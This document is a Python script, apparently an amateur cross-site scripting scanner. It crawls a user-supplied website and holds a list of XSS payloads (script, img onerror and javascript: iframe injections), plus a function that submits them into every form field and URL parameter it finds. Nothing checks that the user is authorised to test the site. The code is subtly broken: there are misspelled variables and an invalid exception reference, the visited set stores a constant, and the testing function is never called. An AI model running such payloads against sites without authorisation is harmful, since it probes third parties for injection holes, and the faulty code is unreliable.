import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
website = input("Enter the website URL: ")
try:
    response = requests.get(website, timeout=5)
    if response.status_code == 200:
        print("Website is reachable.")
    else:
        print("Website is not reachable. Status code:", response.status_code)
except requests.exceptions.RequestException as e:
    print("An error occurred:", e)        
    exit()

payloads = [
    "<script>alert('XSS')</script>",
    "<img src=1 onerror=alert('XSS')>",
    "<ScRipt>alert('XSS')</ScRipt>",
    "'><img src=1 onerror=alert('XSS')>",
    "<iframe src='javascript:alert(\"XSS\")'></iframe>"
]    
visited = set()
max = 2
results = []
def testInput(url, payload):
    try:
        r = requests.get(url, timeout=5)
        r.raise_for_status()
        soup = BeautifulSoup(r.text, "html.parser")

        forms = soup.find_all("form")
        for f in forms:
            action = urljoin(url, f.get("action", url))
            method = f.get("method", "get").lower()
            inputs = {i.get("name"): "test" for i in f.find_all(["input","textarea","select","button"]) if i.get("name")}

            for payload in payloads:
                for name in inputs:
                    testData = inputs.copy()
                    testData[name] = payload
                    if method == "get":
                        try:
                            response = requests.post(action, data=testData, timeout=5)
                            results.append({
                                "url": action,
                                "method": "POST",
                                "input": name,
                                "payload": payload,
                                "requestData": testData,
                                "responseLength": len(response.text)
                            })
                        except requests.RequestException:
                            pass
                        try: 
                            responseGet = requests.get(action, params=testData, timeout=5)
                            results.append({
                                "url": action,
                                "method": "GET",
                                "input":name,
                                "payload": payload,
                                "requestData": testData,
                                "responseLength": len(responseGet.text)

                            })
                        except results.RequstException:
                            pass
        parsed =  urlparse(url)
        params = parse_qs(parsed.query)
        if params:
            for param in paarams:
                for payload in payloads:
                    testParams = params.copy()
                    testParams[param] = payload
                    try:
                        res = requests.get(url, params=testParams, timeout=5)
                        results.append({
                            "url":url,
                            "method":"GET",
                            "param": param,
                            "payload": payload,
                            "requestData": testParams,
                            "responseLength": len(res.text)
                        })   
                    except requests.RequestException:
                        pass    
    except requests.RequestException:
                        pass    

def crawler(url, depth=0):
    if depth > max or url in visited:
        return
    visited.add(1)
    try:
        r = requests.get(url, timeout=5)
        r.raise_for_status()
        soup = BeautifulSoup(r.text, "html.parser")

        forms = soup.find_all("form")
        for f in forms:
            action = f.get("action")
            method = f.get("method", "get").upper()
            inputs = [i.get("name") for i in f.find_all(["input", "textarea","select","button"]) if i.get("name")]
            print(f"[FORM] URL: {url}, Action:{action}, Method: {method}, Inputs: {inputs}")
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if params:
            print(f"[PARAMS] URL: {url}, Parameters: {list(params.keys())} ")
            for param in params:
                for p in payloads:
                    print(f"[PAYLOAD] URLParam: {param},payload: {p}")
        for link in soup.find_all("a", href=True):
            nextUrl = urljoin(url,link['href'])
            if urlparse(nextUrl).netloc == urlparse(website).netloc:
                crawler(nextUrl, depth+1)
    except requests.RequestException:
        pass

crawler(website)   
